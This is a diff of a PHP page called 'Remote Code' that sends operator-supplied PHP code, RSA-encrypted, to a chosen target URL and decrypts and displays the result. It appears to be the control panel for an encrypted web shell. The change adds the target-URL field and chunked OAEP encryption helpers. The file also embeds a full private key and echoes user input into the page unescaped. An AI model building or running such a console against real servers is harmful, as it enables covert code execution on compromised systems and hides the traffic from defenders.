@@ -1,9 +1,9 @@
 <?php
 define('POST_KEY', 'page');
-define('TARGET_URL', 'https://example.com/client.php');
-
+$url = isset($_POST['url']) ? $_POST['url'] : 'https://example.com/client.php';
 $code = isset($_POST['code']) ? $_POST['code'] : 'return "Hello, World!";';
 $decrypted = '';
+
 $server_key = '-----BEGIN PRIVATE KEY-----
 MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC5CkJEWQxYDPoR
 mukgJzf4yE6C/9NOdR4eFRY8Oobd5E2eqDEFY4jvC+P5Px3ngGl+MtD+gMhoTE+i
@@ -55,8 +55,7 @@ vnOOQs4pPrZIRaT621WbpsnhBVPNmLjrPiocnEepoyU+IEewlBcvfzduuBcH+h/V
 ydgkeDOIRzdzezMsr9TOQXbMDkV2bdsOQxxbINbYV8RQRaYNGHJtuK+ixOkuHvE/
 3jI3CfeVblxBXprF0kMiPtRWE3lzPUJFUAjfY4DmrKf7eahs6ATTTYJ4y603nyYa
 wc3H6v5T9/3iZSMVhwJ9UtfOr5jz6mc=
------END PRIVATE KEY-----
-';
+-----END PRIVATE KEY-----';
 $client_pub = '-----BEGIN PUBLIC KEY-----
 MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2i3GUqQZzArEVwVeiUCI
 T2N+s5Y9mCeH0fcD0b0llIErzRRrLDjmhPco94cY7C3+I+RoF0XdsJHV/nVlA4l8
@@ -72,20 +71,16 @@ lQk41JSNfgaQ1h+Ii8l839JiSCXVWeK4Mj4mmeSr9KVXkKbX9aa1ZQDqyUYjloV3
 D3uBj7TAR09T0GsgaVZoLvUCAwEAAQ==
 -----END PUBLIC KEY-----';
 
-if(isset($_POST['code'])) {
-    openssl_public_encrypt($code, $encrypted, $client_pub);
-
-    $encrypted_base64 = base64_encode($encrypted);
+if (isset($_POST['code'])) {
+    $encrypted = ssl_encrypt($code, $client_pub);
 
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, TARGET_URL);
+    curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(POST_KEY => $encrypted_base64)));
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(POST_KEY => $encrypted)));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
+    $encryptedData = curl_exec($ch);
     curl_close($ch);
-
-    $encryptedData = base64_decode($response);
 
     $priKey = openssl_pkey_get_private($server_key);
 
@@ -93,23 +88,86 @@ if(isset($_POST['code'])) {
         die('loading private key failed');
     }
 
-    if (!openssl_private_decrypt($encryptedData, $decrypted, $priKey)) {
+    $decrypted = ssl_decrypt($encryptedData, $priKey);
+
+    if (!$decrypted = ssl_decrypt($encryptedData, $priKey)) {
         die('decrypt failed');
     }
 }
 
 
+function ssl_encrypt($source, $pem)
+{
+    $bits = ssl_getbits($pem);
+    $encrypted = '';
+    $cursor = 0;
+    $blocksize = $bits / 8 - 42;
+
+    while ($data = substr($source, $cursor, $blocksize)) {
+        set_time_limit(10);
+        error_clear_last();
+        openssl_public_encrypt($data, $blockdata, $pem, OPENSSL_PKCS1_OAEP_PADDING);
+        if (!empty(error_get_last())) {
+            return false;
+        }
+        $encrypted .= $blockdata;
+        $cursor += $blocksize;
+    }
+
+    return base64_encode($encrypted);
+}
+
+function ssl_decrypt($source, $pem)
+{
+    $source = base64_decode($source);
+    $bits = ssl_getbits($pem);
+    $decrypted = '';
+    $cursor = 0;
+    $blocksize = $bits / 8;
+
+    while ($data = substr($source, $cursor, $blocksize)) {
+        set_time_limit(10);
+        error_clear_last();
+        openssl_private_decrypt($data, $blockdata, $pem, OPENSSL_PKCS1_OAEP_PADDING);
+        if (!empty(error_get_last())) {
+            return false;
+        }
+        $decrypted .= $blockdata;
+        $cursor += $blocksize;
+    }
+
+    return $decrypted;
+}
+
+function ssl_getbits($pem)
+{
+    $key = openssl_pkey_get_public($pem);
+    if (is_resource($key)) {
+        $keyinfo = (object) openssl_pkey_get_details($key);
+        return $keyinfo->bits;
+    }
+
+    return false;
+}
+
 ?>
 <html>
+
 <head>
-    <title></title>
+    <title>Remote Code</title>
 </head>
+
 <body>
+    <h1>Remote Code</h1>
     <form method="post">
+        <h2>Target URL:</h2>
+        <input type="url" name="url" value="<?php echo $url; ?>" style="width:400px;"><br>
+        <h2>PHP Code:</h2>
         <textarea name="code" rows="10" cols="50"><?php echo $code; ?></textarea><br>
         <input type="submit" value="Submit">
     </form>
     <h2>Result:</h2>
     <pre><?php echo $decrypted; ?></pre>
 </body>
+
 </html>
